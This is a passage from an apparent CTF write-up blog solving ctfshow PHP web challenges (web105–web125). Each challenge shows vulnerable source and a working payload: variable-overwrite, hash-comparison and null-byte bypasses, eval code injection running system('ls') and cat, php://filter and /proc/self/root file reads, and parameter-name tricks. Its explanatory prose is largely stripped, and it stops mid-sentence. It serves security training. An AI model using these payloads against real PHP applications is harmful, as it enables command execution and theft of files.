if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value; </span><br></pre></td></tr></table></figure>\n\n<p>GETKEYVALUE</p>\n<p> <code>$$key=$$value;</code> keyerror</p>\n<p> <code>suces=flag</code></p>\n<p> <code>$suces=$flag</code>flagsucesseceserror</p>\n<p>post <code>error=suces</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$errot=$suces=$flag</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error); </span><br></pre></td></tr></table></figure>\n\n<p>errorerrorflag</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?suces=flag</span><br><span class=\"line\"></span><br><span class=\"line\">POST:error=suces</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web106\"><a href=\"#web106\" class=\"headerlink\" title=\"web106\"></a>web106</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"web107\"><a href=\"#web107\" class=\"headerlink\" title=\"web107\"></a>web107</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">       parse_str($v1,$v2);</span><br><span class=\"line\">       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;</span><br><span class=\"line\">           echo $flag;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code></p>\n<blockquote>\n<p><strong>parse_str</strong> ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p>\n<p> <code>encoded_string</code>  URL query string <code>result</code>  </p>\n</blockquote>\n<p>v3&#x3D;flag</p>\n<p><code>v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</code>flagmd5</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v3=flag</span><br><span class=\"line\">POST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</span><br></pre></td></tr></table></figure>\n\n<p> md5nullv2flagnullnull&#x3D;&#x3D;null</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v3[]=</span><br><span class=\"line\">POST:V1=</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web108\"><a href=\"#web108\" class=\"headerlink\" title=\"web108\"></a>web108</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;</span><br><span class=\"line\">    die(&#x27;error&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//36dflag</span><br><span class=\"line\">if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>ereg%00</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=a%00778</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web109\"><a href=\"#web109\" class=\"headerlink\" title=\"web109\"></a>web109</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class=\"line\">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>v1v2evalweb101<br>$v1v1$v2()</p>\n<p>__toString()phpReflectionclassExceptionError<br><code>__toString()</code></p>\n<blockquote>\n<p>PHP5.2.0__toString()  echo  print PHP5.2.0</p>\n</blockquote>\n<p>echo<code>$v1</code><code>__toString()</code>v2</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=CachingIterator&amp;v2=system(ls)</span><br><span class=\"line\">?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web110\"><a href=\"#web110\" class=\"headerlink\" title=\"web110\"></a>web110</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class=\"line\">            die(&quot;error v1&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class=\"line\">            die(&quot;error v2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>FilesystemIteratorFilesystemIteratorgetcwd()</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>\n\n<p>fl36dga.txt</p>\n<p>url&#x2F;fl36dga.txtflag</p>\n<p><code>FilesystemIterator</code></p>\n<p></p>\n<p></p>\n<blockquote>\n<p>FilesystemIteratorgetcwd()</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(0);</span><br><span class=\"line\">\techo getcwd().PHP_EOL;</span><br><span class=\"line\">\techo new FilesystemIterator(&#x27;./&#x27;).PHP_EOL;</span><br><span class=\"line\">\techo new FilesystemIterator(getcwd());</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">D:\\PHP</span><br><span class=\"line\">  index.php</span><br><span class=\"line\">  index.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web111\"><a href=\"#web111\" class=\"headerlink\" title=\"web111\"></a>web111</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class=\"line\">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class=\"line\">    var_dump($$v1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123;</span><br><span class=\"line\">            die(&quot;error v1&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123;</span><br><span class=\"line\">            die(&quot;error v2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class=\"line\">            getFlag($v1,$v2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     </span><br></pre></td></tr></table></figure>\n\n<p>v1ctfshowgetFlag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class=\"line\">    var_dump($$v1);</span><br></pre></td></tr></table></figure>\n\n<p>$ctfshow&#x3D;$$v2,$$v1</p>\n<p><code>v2=GLOBALS</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump($GLOBALS);</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web112\"><a href=\"#web112\" class=\"headerlink\" title=\"web112\"></a>web112</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&quot;hacker!&quot;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>is_file</code></p>\n<blockquote>\n<p></p>\n</blockquote>\n<p>is_filephp</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web113\"><a href=\"#web113\" class=\"headerlink\" title=\"web113\"></a>web113</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&#x27;hacker!&#x27;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>filter</p>\n<p><strong>linux<code>/proc/self/root</code></strong></p>\n<p><code>ls /proc/self/root</code></p>\n<p><code>is_file</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>\n\n<p>flag.php</p>\n<h3 id=\"web114\"><a href=\"#web114\" class=\"headerlink\" title=\"web114\"></a>web114</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&#x27;hacker!&#x27;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">echo &quot;tql &quot;;</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>compress</code><code>root</code>ban</p>\n<p></p>\n<p><code>filter</code>ban</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web115\"><a href=\"#web115\" class=\"headerlink\" title=\"web115\"></a>web115</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($num)&#123;</span><br><span class=\"line\">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    return $num;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$num=$_GET[&#x27;num&#x27;];</span><br><span class=\"line\">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class=\"line\">    if($num==&#x27;36&#x27;)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo &quot;hacker!!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!!!&quot;; </span><br></pre></td></tr></table></figure>\n\n<p><code>trim</code></p>\n<blockquote>\n<p> </p>\n<p> <strong>trim()</strong> </p>\n<ul>\n<li>  (ASCII <em>32</em> (<em>0x20</em>))</li>\n<li>\\t (ASCII <em>9</em> (<em>0x09</em>))</li>\n<li>\\n (ASCII <em>10</em> (<em>0x0A</em>))</li>\n<li>\\r (ASCII <em>13</em> (<em>0x0D</em>))</li>\n<li>\\0 (ASCII <em>0</em> (<em>0x00</em>))</li>\n<li>\\x0B (ASCII <em>11</em> (<em>0x0B</em>))</li>\n</ul>\n</blockquote>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">for($i=1;$i&lt;=128;$i++)&#123;</span><br><span class=\"line\">    $a=chr($i).&#x27;1&#x27;;</span><br><span class=\"line\">    if(trim($a)!==&#x27;1&#x27;&amp;&amp;is_numeric($a))&#123;</span><br><span class=\"line\">        echo urlencode(chr($i));</span><br><span class=\"line\">        echo &quot;\\n&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> %0c()</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=%0c36</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web123\"><a href=\"#web123\" class=\"headerlink\" title=\"web123\"></a>web123</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<blockquote>\n<p>phppostget+[[such as<code>CTF[SHOW.COM</code>&#x3D;&gt;<code>CTF_SHOW.COM</code></p>\n</blockquote>\n<p><code>POST</code>  <code>CTF_SHOW.COM</code><code>CTF_SHOW_COM</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST: CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web125\"><a href=\"#web125\" class=\"headerlink\" title=\"web125\"></a>web125</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);</span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>echo</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>$_SERVER[argv]</p>\n<p>1cli</p>\n<pre><code>$_SERVER[&#39;argv&#39;][0]\n</code></pre>\n<p>2web</p>\n<pre><code>webphp.iniregister_argc_argv\n    \nregister_argc_argv = 